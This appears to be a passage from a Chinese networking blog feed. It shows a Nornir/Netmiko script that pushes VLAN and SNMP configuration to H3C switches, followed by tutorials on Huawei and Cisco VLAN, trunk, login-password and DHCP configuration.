<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sysname test</span><br><span class="line">vlan 10</span><br><span class="line">vlan 20</span><br><span class="line">vlan 30</span><br><span class="line">inter range eth1/0/1 to eth1/0/8</span><br><span class="line">port link-type access</span><br><span class="line">port access vlan 10</span><br><span class="line">inter range eth1/0/9 to eth1/0/16</span><br><span class="line">port link-type access</span><br><span class="line">port access vlan 20</span><br><span class="line">inter range g1/0/17 to g1/0/23</span><br><span class="line">port link-type access</span><br><span class="line">port access vlan 30</span><br><span class="line">snmp-agent</span><br><span class="line">snmp-agent comm read simple public</span><br><span class="line">snmp-agent sys ver v2c</span><br></pre></td></tr></table></figure>

<p>config.txt里面为需要配置的命令。</p>
</li>
</ul>
<h2 id="推送交换机配置文件脚本"><a href="#推送交换机配置文件脚本" class="headerlink" title="推送交换机配置文件脚本"></a>推送交换机配置文件脚本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from nornir import InitNornir</span><br><span class="line">from nornir.core.task import Result</span><br><span class="line">from nornir_netmiko import netmiko_send_config,netmiko_save_config</span><br><span class="line">from nornir_utils.plugins.functions import print_result,print_title</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">switch = InitNornir(config_file=&quot;config.yaml&quot;)</span><br><span class="line"></span><br><span class="line">def push_and_save_configs(task):</span><br><span class="line">    save_type = task.host.groups[0].data.get(&quot;save_config_type&quot;,&quot;save&quot;)</span><br><span class="line"></span><br><span class="line">    config_push_result = task.run(netmiko_send_config,config_file=&quot;config.txt&quot;)</span><br><span class="line">    config_save_result = task.run(netmiko_save_config)</span><br><span class="line"></span><br><span class="line">    return Result(host=task.host,</span><br><span class="line">                  result=[config_push_result.result,config_save_result.result],</span><br><span class="line">                  changed=True</span><br><span class="line">                  )</span><br><span class="line">print_title(&quot;正在保存配置......&quot;)</span><br><span class="line">results = switch.run(task=push_and_save_configs)</span><br><span class="line">print_result(results)</span><br></pre></td></tr></table></figure>



<h2 id="脚本执行结果"><a href="#脚本执行结果" class="headerlink" title="脚本执行结果"></a>脚本执行结果</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;C:\Program Files\Python38\python.exe&quot; E:/nonir_test/push_config.py</span><br><span class="line">**** 正在保存配置...... **************************************************************</span><br><span class="line">push_and_save_configs***********************************************************</span><br><span class="line">* sw1 ** changed : True ********************************************************</span><br><span class="line">vvvv push_and_save_configs ** changed : True vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv INFO</span><br><span class="line">[ &#x27;sysname test\n&#x27;</span><br><span class="line">  &#x27;[test]vlan 10\n&#x27;</span><br><span class="line">  &#x27;[test-vlan10]vlan 20\n&#x27;</span><br><span class="line">  &#x27;[test-vlan20]vlan 30\n&#x27;</span><br><span class="line">  &#x27;[test-vlan30]inter range eth1/0/1 to eth1/0/8\n&#x27;</span><br><span class="line">  &#x27;[test-if-range]port link-type access\n&#x27;</span><br><span class="line">  &#x27;[test-if-range]port access vlan 10\n&#x27;</span><br><span class="line">  &#x27;[test-if-range]inter range eth1/0/9 to eth1/0/16\n&#x27;</span><br><span class="line">  &#x27;[test-if-range]port link-type access\n&#x27;</span><br><span class="line">  &#x27;[test-if-range]port access vlan 20\n&#x27;</span><br><span class="line">  &#x27;[test-if-range]inter range g1/0/17 to g1/0/23\n&#x27;</span><br><span class="line">  &#x27;[test-if-range]port link-type access\n&#x27;</span><br><span class="line">  &#x27;[test-if-range]port access vlan 30\n&#x27;</span><br><span class="line">  &#x27;[test-if-range]snmp-agent\n&#x27;</span><br><span class="line">  &#x27;[test]snmp-agent comm read simple public\n&#x27;</span><br><span class="line">  &#x27;[test]snmp-agent sys ver v2c\n&#x27;</span><br><span class="line">  &#x27;[test]return\n&#x27;</span><br><span class="line">  &#x27;&lt;test&gt;&#x27;,</span><br><span class="line">  &#x27;save force\n&#x27;</span><br><span class="line">  &#x27;Validating file. Please wait...\n&#x27;</span><br><span class="line">  &#x27;Saved the current configuration to mainboard device successfully.\n&#x27;</span><br><span class="line">  &#x27;[test]&#x27;]</span><br><span class="line">---- netmiko_send_config ** changed : True ------------------------------------- INFO</span><br><span class="line">sysname test</span><br><span class="line">[test]vlan 10</span><br><span class="line">[test-vlan10]vlan 20</span><br><span class="line">[test-vlan20]vlan 30</span><br><span class="line">[test-vlan30]inter range eth1/0/1 to eth1/0/8</span><br><span class="line">[test-if-range]port link-type access</span><br><span class="line">[test-if-range]port access vlan 10</span><br><span class="line">[test-if-range]inter range eth1/0/9 to eth1/0/16</span><br><span class="line">[test-if-range]port link-type access</span><br><span class="line">[test-if-range]port access vlan 20</span><br><span class="line">[test-if-range]inter range g1/0/17 to g1/0/23</span><br><span class="line">[test-if-range]port link-type access</span><br><span class="line">[test-if-range]port access vlan 30</span><br><span class="line">[test-if-range]snmp-agent</span><br><span class="line">[test]snmp-agent comm read simple public</span><br><span class="line">[test]snmp-agent sys ver v2c</span><br><span class="line">[test]return</span><br><span class="line">&lt;test&gt;</span><br><span class="line">---- netmiko_save_config ** changed : True ------------------------------------- INFO</span><br><span class="line">save force</span><br><span class="line">Validating file. Please wait...</span><br><span class="line">Saved the current configuration to mainboard device successfully.</span><br><span class="line">[test]</span><br><span class="line">^^^^ END push_and_save_configs ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line"></span><br><span class="line">进程已结束，退出代码为 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="交换机执行完结果"><a href="#交换机执行完结果" class="headerlink" title="交换机执行完结果"></a>交换机执行完结果</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[test]dis cu</span><br><span class="line">#</span><br><span class="line"> version 7.1.070, Release 6318P01</span><br><span class="line">#</span><br><span class="line"> sysname test</span><br><span class="line">#</span><br><span class="line"> irf mac-address persistent timer</span><br><span class="line"> irf auto-update enable</span><br><span class="line"> undo irf link-delay</span><br><span class="line"> irf member 1 priority 1</span><br><span class="line">#</span><br><span class="line"> lldp global enable</span><br><span class="line">#</span><br><span class="line"> password-recovery enable</span><br><span class="line">#</span><br><span class="line">vlan 1</span><br><span class="line">#</span><br><span class="line">vlan 5</span><br><span class="line">#</span><br><span class="line">vlan 10</span><br><span class="line">#</span><br><span class="line">vlan 20</span><br><span class="line">#</span><br><span class="line">vlan 30</span><br><span class="line">#              </span><br><span class="line"> stp global enable</span><br><span class="line">#</span><br><span class="line">interface NULL0</span><br><span class="line">#</span><br><span class="line">interface Vlan-interface1</span><br><span class="line"> ip address dhcp-alloc</span><br><span class="line"> dhcp client identifier ascii 3cd2e58c491d-VLAN0001</span><br><span class="line">#</span><br><span class="line">interface Vlan-interface5</span><br><span class="line"> ip address 192.168.8.254 255.255.255.0</span><br><span class="line">#</span><br><span class="line">interface Ethernet1/0/1</span><br><span class="line"> port access vlan 10</span><br><span class="line">#</span><br><span class="line">interface Ethernet1/0/2</span><br><span class="line"> port access vlan 10</span><br><span class="line">#</span><br><span class="line">interface Ethernet1/0/3</span><br><span class="line"> port access vlan 10</span><br><span class="line">#</span><br><span class="line">interface Ethernet1/0/4</span><br><span class="line"> port access vlan 10</span><br><span class="line">#              </span><br><span class="line">interface Ethernet1/0/5</span><br><span class="line"> port access vlan 10</span><br><span class="line">#</span><br><span class="line">interface Ethernet1/0/6</span><br><span class="line"> port access vlan 10</span><br><span class="line">#</span><br><span class="line">interface Ethernet1/0/7</span><br><span class="line"> port access vlan 10</span><br><span class="line">#</span><br><span class="line">interface Ethernet1/0/8</span><br><span class="line"> port access vlan 10</span><br><span class="line">#</span><br><span class="line">interface Ethernet1/0/9</span><br><span class="line"> port access vlan 20</span><br><span class="line">#</span><br><span class="line">interface Ethernet1/0/10</span><br><span class="line"> port access vlan 20</span><br><span class="line">#</span><br><span class="line">interface Ethernet1/0/11</span><br><span class="line"> port access vlan 20</span><br><span class="line">#</span><br><span class="line">interface Ethernet1/0/12</span><br><span class="line"> port access vlan 20</span><br><span class="line">#</span><br><span class="line">interface Ethernet1/0/13</span><br><span class="line"> port access vlan 20</span><br><span class="line">#</span><br><span class="line">interface Ethernet1/0/14</span><br><span class="line"> port access vlan 20</span><br><span class="line">#</span><br><span class="line">interface Ethernet1/0/15</span><br><span class="line"> port access vlan 20</span><br><span class="line">#</span><br><span class="line">interface Ethernet1/0/16</span><br><span class="line"> port access vlan 20</span><br><span class="line">#</span><br><span class="line">interface GigabitEthernet1/0/17</span><br><span class="line"> port access vlan 30</span><br><span class="line">#</span><br><span class="line">interface GigabitEthernet1/0/18</span><br><span class="line"> port access vlan 30</span><br><span class="line">#</span><br><span class="line">interface GigabitEthernet1/0/19</span><br><span class="line"> port access vlan 30</span><br><span class="line">#</span><br><span class="line">interface GigabitEthernet1/0/20</span><br><span class="line"> port access vlan 30</span><br><span class="line">#</span><br><span class="line">interface GigabitEthernet1/0/21</span><br><span class="line"> port access vlan 30</span><br><span class="line">#</span><br><span class="line">interface GigabitEthernet1/0/22</span><br><span class="line"> port access vlan 30</span><br><span class="line">#</span><br><span class="line">interface GigabitEthernet1/0/23</span><br><span class="line"> port access vlan 30</span><br><span class="line">#</span><br><span class="line">interface GigabitEthernet1/0/24</span><br><span class="line"> port access vlan 5</span><br><span class="line">#</span><br><span class="line">interface GigabitEthernet1/0/25</span><br><span class="line">#</span><br><span class="line">interface GigabitEthernet1/0/26</span><br><span class="line">#</span><br><span class="line">interface GigabitEthernet1/0/27</span><br><span class="line">#</span><br><span class="line">interface GigabitEthernet1/0/28</span><br><span class="line">#</span><br><span class="line"> scheduler logfile size 16</span><br><span class="line">#</span><br><span class="line">line class aux</span><br><span class="line"> user-role network-admin</span><br><span class="line">#</span><br><span class="line">line class vty</span><br><span class="line"> user-role network-operator</span><br><span class="line">#</span><br><span class="line">line aux 0</span><br><span class="line"> user-role network-admin</span><br><span class="line">#</span><br><span class="line">line vty 0 4</span><br><span class="line"> authentication-mode scheme</span><br><span class="line"> user-role network-operator</span><br><span class="line"> protocol inbound ssh</span><br><span class="line">#</span><br><span class="line">line vty 5 63</span><br><span class="line"> user-role network-operator</span><br><span class="line">#</span><br><span class="line"> ip route-static 0.0.0.0 0 192.168.8.1</span><br><span class="line">#</span><br><span class="line"> snmp-agent</span><br><span class="line"> snmp-agent local-engineid 800063A2803CD2E58C492800000001</span><br><span class="line"> snmp-agent community read cipher $c$3$Rqh8sSNIfbVRstiA6l4bwgxjO9Kv7Y/bZt8=</span><br><span class="line"> snmp-agent sys-info version v2c v3 </span><br><span class="line">#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="使用Filter进行过滤"><a href="#使用Filter进行过滤" class="headerlink" title="使用Filter进行过滤"></a>使用Filter进行过滤</h2><p>有些因为版本问题，交换机执行命令可能有所差异，那么就需要用到Filter进行过滤，分别执行：</p>
<p>示例脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from nornir import InitNornir</span><br><span class="line">from nornir.core.task import Result</span><br><span class="line">from nornir_netmiko import netmiko_send_config,netmiko_save_config</span><br><span class="line">from nornir_utils.plugins.functions import print_result,print_title</span><br><span class="line">from nornir.core.filter import F</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">old_devs = InitNornir(config_file=&quot;config.yaml&quot;)</span><br><span class="line">group1 = old_devs.filter(F(groups__contains=&quot;h3c_old&quot;))</span><br><span class="line">def push_and_save_configs(task):</span><br><span class="line">    save_type = task.host.groups[0].data.get(&quot;save_config_type&quot;,&quot;save&quot;)</span><br><span class="line"></span><br><span class="line">    config_push_result = task.run(netmiko_send_config,config_file=&quot;config.txt&quot;)</span><br><span class="line">    config_save_result = task.run(netmiko_save_config)</span><br><span class="line"></span><br><span class="line">    return Result(host=task.host,</span><br><span class="line">                  result=[config_push_result.result,config_save_result.result],</span><br><span class="line">                  changed=True</span><br><span class="line">                  )</span><br><span class="line">print_title(&quot;正在保存配置......&quot;)</span><br><span class="line">results = group1.run(task=push_and_save_configs)</span><br><span class="line">print_result(results)</span><br></pre></td></tr></table></figure>

<p>对应的hosts文件和groups也需要做出调整，下面是hosts.yaml和groups.yaml示例文件。</p>
<ul>
<li>hosts.yaml</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">sw1:</span><br><span class="line">  hostname: 192.168.8.254</span><br><span class="line">  groups:</span><br><span class="line">    - h3c</span><br><span class="line">sw2:</span><br><span class="line">  hostname: 192.168.2.129</span><br><span class="line">  groups:</span><br><span class="line">    - h3c_old</span><br></pre></td></tr></table></figure>



<ul>
<li>groups.yaml</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">h3c:</span><br><span class="line">  data:</span><br><span class="line">    save_config_type: save</span><br><span class="line">    backup_configs:</span><br><span class="line">      - display current-configuration</span><br><span class="line">h3c_old:</span><br><span class="line">  data:</span><br><span class="line">    save_config_type: save</span><br><span class="line">    backup_configs:</span><br><span class="line">      - display current-configuration</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>此脚本目前已经测试过华为与华三交换机，都正常可以使用。</p>
]]></content>
      <categories>
        <category>网络与自动化</category>
      </categories>
      <tags>
        <tag>Nornir3</tag>
        <tag>python</tag>
        <tag>自动化配置</tag>
      </tags>
  </entry>
  <entry>
    <title>华为与思科交换机vlan、trunk的配置</title>
    <url>/archives/5a3b77b6.html</url>
    <content><![CDATA[<p>关于vlan方面的笔记，不是特别全。</p>
<span id="more"></span>

<h2 id="vlan概述"><a href="#vlan概述" class="headerlink" title="vlan概述"></a>vlan概述</h2><ul>
<li>  物理设备上连接的不受物理位置限制的用户的一个逻辑组。</li>
<li>  引入vlan的原因：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.交换机分割了冲突域，但不能分割广播域。</span><br><span class="line">2.随着交换机端口的数量的增多，网络中广播增多，较低了网络的效率。</span><br><span class="line">3.为了分割广播域，引入了vlan。</span><br></pre></td></tr></table></figure>

<h2 id="pvid"><a href="#pvid" class="headerlink" title="pvid"></a>pvid</h2><ul>
<li>  pvid表示端口所属的vlan。</li>
<li>  默认情况下，交换机所有端口的pvid都是1.</li>
</ul>
<h2 id="access端口"><a href="#access端口" class="headerlink" title="access端口"></a>access端口</h2><ul>
<li>  access端口在接收到数据后会添加vlan tag，vlan id和端口的pvid相同。</li>
<li>  access端口在发送数据时会删除vlan tag。</li>
</ul>
<h2 id="华为交换机配置vlan"><a href="#华为交换机配置vlan" class="headerlink" title="华为交换机配置vlan"></a>华为交换机配置vlan</h2><p>创建vlan</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[huawei] vlan 10</span><br><span class="line">[huawei-vlan10] description vlan-name    //(可选)vlan的描述</span><br></pre></td></tr></table></figure>

<p>创建多个vlan</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[huawei] vlan batch 10 20 30</span><br><span class="line">[huawei] vlan batch 10 to 15</span><br></pre></td></tr></table></figure>

<p>删除vlan</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[huawei] undo vlan 10</span><br><span class="line">[huawei] undo vlan batch 10 20 </span><br><span class="line">[huawei] undo vlan batch 10 to 15 </span><br></pre></td></tr></table></figure>

<p>端口加入vlan</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[huawei] interface ethernet0/0/1</span><br><span class="line">[huawei-Ethernet0/0/1] port link-type access</span><br><span class="line">[huawei-Ethernet0/0/1] port default vlan 10</span><br></pre></td></tr></table></figure>

<p>多个端口加入vlan</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Huawei] port-group 1</span><br><span class="line">[Huawei-port-group-1] group-member eth0/0/1 eth0/0/2</span><br><span class="line">[Huawei-port-group-1] group-member eth0/0/1 to eth0/0/10</span><br><span class="line">[Huawei-port-group-1] port link-type access</span><br><span class="line">[Huawei-port-group-1] port default vlan 10 </span><br></pre></td></tr></table></figure>

<p>查看vlan信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[huawei] display vlan</span><br><span class="line">[huawei] display vlan 10 </span><br></pre></td></tr></table></figure>

<h2 id="思科交换机配置vlan"><a href="#思科交换机配置vlan" class="headerlink" title="思科交换机配置vlan"></a>思科交换机配置vlan</h2><p>创建单个vlan</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Switch&gt; enable</span><br><span class="line">Switch# configure terminal</span><br><span class="line">Switch(config)# vlan 10</span><br><span class="line">Switch(config-vlan)# name vlan-name //(可选)vlan的名称</span><br><span class="line">Switch(config)# interface vlan 10</span><br><span class="line">Switch(config-if)# description vlan-name //(可选)vlan的描述</span><br></pre></td></tr></table></figure>

<p>创建多个vlan</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Switch# vlan database </span><br><span class="line">Switch(vlan)#vlan 20 name vlan-name //(可选)vlan的名称</span><br></pre></td></tr></table></figure>

<p>删除vlan</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Switch# vlan database </span><br><span class="line">Switch(vlan)# no vlan 20</span><br><span class="line">或</span><br><span class="line">Switch(config)# no vlan 30</span><br><span class="line">对于已经开启的vlan 需要进入vlan shutdown一下</span><br><span class="line">Switch(config)# interface vlan 10</span><br><span class="line">Switch(config-if)# shutdown</span><br><span class="line">Switch(config-if)# exit</span><br><span class="line">Switch(config)# no vlan 10</span><br></pre></td></tr></table></figure>

<p>端口加入vlan</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Switch(config)# interface FastEthernet0/1</span><br><span class="line">Switch(config-if)# switchport mode access</span><br><span class="line">Switch(config-if)# switchport access vlan 10</span><br></pre></td></tr></table></figure>

<p>多个端口加入vlan</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Switch(config)# interface range FastEthernet 0/2-12</span><br><span class="line">Switch(config-if-range)# switchport mode access </span><br><span class="line">Switch(config-if-range)# switchport access vlan 10</span><br></pre></td></tr></table></figure>

<p>查看vlan信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Switch# show vlan</span><br><span class="line">Switch# show vlan id 10</span><br></pre></td></tr></table></figure>

<h2 id="trunk端口"><a href="#trunk端口" class="headerlink" title="trunk端口"></a>trunk端口</h2><ul>
<li>  trunk端口发送帧时，与端口pvid不同则直接发送；如果与端口pvid相同，则去除tag后发送。</li>
<li>  trunk端口收到帧时，该帧不携带tag，将打上端口的pvid；如果携带tag，则不做改变。</li>
</ul>
<h2 id="华为交换机配置trunk"><a href="#华为交换机配置trunk" class="headerlink" title="华为交换机配置trunk"></a>华为交换机配置trunk</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Huawei&gt; system-view</span><br><span class="line">[Huawei] interface GigabitEthernet 0/0/24</span><br><span class="line">[Huawei-GigabitEthernet0/0/24] port link-type trunk</span><br><span class="line">[Huawei-GigabitEthernet0/0/24] port trunk allow-pass vlan 10</span><br><span class="line">[Huawei-GigabitEthernet0/0/24] port trunk pvid vlan 10 //设置trunk模式下端口的pvid</span><br></pre></td></tr></table></figure>

<h2 id="思科交换机配置trunk"><a href="#思科交换机配置trunk" class="headerlink" title="思科交换机配置trunk"></a>思科交换机配置trunk</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Switch&gt; enable</span><br><span class="line">Switch# configure terminal</span><br><span class="line">Switch(config)# interface FastEthernet 0/1</span><br><span class="line">Switch(config-if)# switchport mode trunk</span><br><span class="line">Switch(config-if)# no shutdown</span><br><span class="line">Switch(config-if)# switchport trunk allowed vlan add 10 //允许通过的vlan</span><br></pre></td></tr></table></figure>

<h2 id="hybrid"><a href="#hybrid" class="headerlink" title="hybrid"></a>hybrid</h2><ul>
<li>  如果在特殊情况下希望灵活控制vlan标签的添加或删除，即可使用hybrid端口。</li>
</ul>
<h2 id="华为交换机配置hybrid端口"><a href="#华为交换机配置hybrid端口" class="headerlink" title="华为交换机配置hybrid端口"></a>华为交换机配置hybrid端口</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[huawei] interface ethernet0/0/1</span><br><span class="line">[huawei-Ethernet0/0/1] port link-type hybrid</span><br><span class="line">[huawei-Ethernet0/0/1] port hybrid pvid vlan 10 //为hybrid端口配置pvid</span><br><span class="line">[huawei-Ethernet0/0/1] port hybrid tagged vlan 10</span><br><span class="line">[huawei-Ethernet0/0/1] port hybrid untagged vlan 10 //允许哪些数据帧通过，默认允许vlan1的数据帧通过</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>网络与自动化</category>
      </categories>
      <tags>
        <tag>vlan，trunk配置</tag>
      </tags>
  </entry>
  <entry>
    <title>华为与思科交换机密码设置</title>
    <url>/archives/5d18222a.html</url>
    <content><![CDATA[<p>工作中几乎碰到的都是H3C，华为交换机，还有就是锐捷，思科交换机，其中H3C和华为交换机配置命令基本一样，锐捷和思科交换机命令基本一样，所以下面就针对华为和思科交换机本地登录和远程登录配置记录一下。</p>
<span id="more"></span>

<h2 id="华为交换机密码配置"><a href="#华为交换机密码配置" class="headerlink" title="华为交换机密码配置"></a>华为交换机密码配置</h2><h2 id="交换机登录密码设置"><a href="#交换机登录密码设置" class="headerlink" title="交换机登录密码设置"></a>交换机登录密码设置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[huawei] user-interface console 0  </span><br><span class="line">[huawei-ui-console0] authentication-mode pass word  </span><br><span class="line">[huawei-ui-console0] set authentication password cipher 密码</span><br></pre></td></tr></table></figure>

<h2 id="远程登录交换机密码配置-telnet"><a href="#远程登录交换机密码配置-telnet" class="headerlink" title="远程登录交换机密码配置(telnet)"></a>远程登录交换机密码配置(telnet)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[huawei] aaa  </span><br><span class="line">[huawei-aaa] local-user 用户名 password cipher 密码  </span><br><span class="line">[huawei-aaa] local-user 用户名 service telnet  </span><br><span class="line">[huawei-aaa] local-user 用户名 privilege 级别(0-15)  </span><br><span class="line">[huawei-aaa] user-interface vty 0 4  </span><br><span class="line">[huawei-ui-vty0-4] authentication-mode aaa  </span><br></pre></td></tr></table></figure>

<h2 id="远程登录交换机密码配置-ssh"><a href="#远程登录交换机密码配置-ssh" class="headerlink" title="远程登录交换机密码配置(ssh)"></a>远程登录交换机密码配置(ssh)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[huawei] local-key-pair create  </span><br><span class="line">[huawei] user-interface vty 0 4  </span><br><span class="line">[huawei-ui-vty0-4] authentication-mode aaa  </span><br><span class="line">[huawei-ui-vty0-4] protocol inbound ssh  </span><br><span class="line">[huawei-ui-vty0-4] quit  </span><br><span class="line">[huawei] ssh user 用户名 authentication-type password  </span><br><span class="line">[huawei] aaa </span><br><span class="line">[huawei-aaa] local-user 用户名 password cipher 密码  </span><br><span class="line">[huawei-aaa] local-user 用户名 privilege level 级别  </span><br><span class="line">[hauwei-aaa] local-user 用户名 service-type ssh  </span><br><span class="line">[huawei-aaa] stelnet server enable  </span><br><span class="line">[huawei] ssh user 用户名 service-type stelnet  </span><br></pre></td></tr></table></figure>

<h2 id="说明"><a href="#说明" class="headerlink" title="说明:"></a>说明:</h2><ul>
<li>  用户不可以配置高于自己级别的用户。</li>
<li>  如果用户界面视图下配置的用户级别与AAA视图下配置的用户级别不同，则以AAA视图下配置的级别为准。</li>
</ul>
<h2 id="思科交换机密码配置"><a href="#思科交换机密码配置" class="headerlink" title="思科交换机密码配置"></a>思科交换机密码配置</h2><h2 id="本地登录密码"><a href="#本地登录密码" class="headerlink" title="本地登录密码"></a>本地登录密码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">switch&gt; enable  </span><br><span class="line">switch# configure-terminal  </span><br><span class="line">switch(config)# line console 0  </span><br><span class="line">switch(config-line)# password 密码  </span><br><span class="line">switch(config-line)# login  </span><br><span class="line">switch(config-line)# exit  </span><br><span class="line">switch# copy running-config startup-config  </span><br><span class="line">switch# reload  </span><br></pre></td></tr></table></figure>
<h2 id="特权密码"><a href="#特权密码" class="headerlink" title="特权密码"></a>特权密码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">switch(config)# enable secret 密码  </span><br></pre></td></tr></table></figure>

<h2 id="远程登录交换机密码配置（telnet）"><a href="#远程登录交换机密码配置（telnet）" class="headerlink" title="远程登录交换机密码配置（telnet）"></a>远程登录交换机密码配置（telnet）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">switch(config)# interface vlan id  </span><br><span class="line">switch(config-if)# ip address ip地址 子网掩码  </span><br><span class="line">switch(config-if)# no shutdown  </span><br><span class="line">switch(config)# exit  </span><br><span class="line">switch(config)# line vty 0 4  </span><br><span class="line">switch(config-line)# password 密码  </span><br><span class="line">switch(config-line)# login  </span><br><span class="line">switch(config-line)# end  </span><br></pre></td></tr></table></figure>

<h2 id="远程登录交换机密码配置（ssh"><a href="#远程登录交换机密码配置（ssh" class="headerlink" title="远程登录交换机密码配置（ssh)"></a>远程登录交换机密码配置（ssh)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">switch(config)# ip domain-name 域名  </span><br><span class="line">sw1(config)# crypto key generate rsa  </span><br><span class="line">sw1(config)# ip ssh time-out 120  </span><br><span class="line">sw1(config)# ip ssh authentication-retries 3  </span><br><span class="line">sw1(config)# ip ssh version 2  </span><br><span class="line">sw1(config)# line vty 0 4  </span><br><span class="line">sw1(config-line)# transport input ssh  </span><br><span class="line">sw1(config-line)# do show ip ssh  </span><br><span class="line">sw1(config)# aaa new-model  </span><br><span class="line">sw1(config)# authentication login default local  </span><br><span class="line">sw1(config)# username 用户名 password 密码  </span><br><span class="line">sw1(config)# service password-encryption</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>网络与自动化</category>
      </categories>
      <tags>
        <tag>交换机ssh，telnet配置</tag>
        <tag>交换机密码配置</tag>
      </tags>
  </entry>
  <entry>
    <title>华为路由器与交换机配置DHCP</title>
    <url>/archives/1a3042c5.html</url>
    <content><![CDATA[<p>整理的关于华为DHCP方面的基本配置。</p>
<span id="more"></span>

<h2 id="基于路由的全局配置"><a href="#基于路由的全局配置" class="headerlink" title="基于路由的全局配置"></a>基于路由的全局配置</h2><p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092921.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;huawei&gt; sys</span><br><span class="line">[huawei] ip pool test //建立地址池并命名</span><br><span class="line">[Huawei-ip-pool-test] network 192.168.1.0 mask 24</span><br><span class="line">[Huawei-ip-pool-test] gateway-list  192.168.1.254</span><br><span class="line">[Huawei-ip-pool-test] dns-list 114.114.114.114</span><br><span class="line">[Huawei-ip-pool-test] lease day 5 //指定租约时间（默认1天）</span><br><span class="line">[Huawei-ip-pool-test] excluded-ip-address 192.168.1.200 192.168.1.254 //设置保留地址范围</span><br><span class="line">[Huawei] dhcp enable</span><br><span class="line">[Huawei-GigabitEthernet0/0/0] ip address 192.168.1.1 24</span><br><span class="line">[Huawei-GigabitEthernet0/0/0] dhcp select global //接口下启用DHCP功能</span><br></pre></td></tr></table></figure>

<h2 id="基于接口的DHCP"><a href="#基于接口的DHCP" class="headerlink" title="基于接口的DHCP"></a>基于接口的DHCP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Huawei] dhcp enable</span><br><span class="line">[Huawei] interface g0/0/0</span><br><span class="line">[Huawei-GigabitEthernet0/0/0] ip address 192.168.2.1 24</span><br><span class="line">[Huawei-GigabitEthernet0/0/0] dhcp select interface  // 接口下启用DHCP功能</span><br><span class="line">[Huawei-GigabitEthernet0/0/0] dhcp server dns-list 8.8.8.8</span><br><span class="line">[Huawei-GigabitEthernet0/0/0] dhcp server lease day 5</span><br><span class="line">[Huawei-GigabitEthernet0/0/0]dhcp server excluded-ip-address 192.168.2.200 192.1</span><br><span class="line">68.2.254</span><br></pre></td></tr></table></figure>

<h2 id="DHCP中继"><a href="#DHCP中继" class="headerlink" title="DHCP中继"></a>DHCP中继</h2><p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092920.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DHCP服务器配置</span><br><span class="line">[Huawei] interface g0/0/0</span><br><span class="line">[Huawei-GigabitEthernet0/0/0] ip address 1.1.1.1 24</span><br><span class="line">[Huawei-GigabitEthernet0/0/0] ip route-static 192.168.3.0 24 1.1.1.2</span><br><span class="line">[Huawei] ip pool test</span><br><span class="line">[Huawei-ip-pool-test] network 192.168.3.0 mask 24</span><br><span class="line">[Huawei-ip-pool-test] ateway-list 192.168.3.1</span><br><span class="line">[Huawei-ip-pool-test] dns-list 8.8.8.8</span><br><span class="line">[Huawei] dhcp enable</span><br><span class="line">[Huawei]interface g0/0/0</span><br><span class="line">[Huawei-GigabitEthernet0/0/0] dhcp select  global</span><br></pre></td></tr></table></figure>

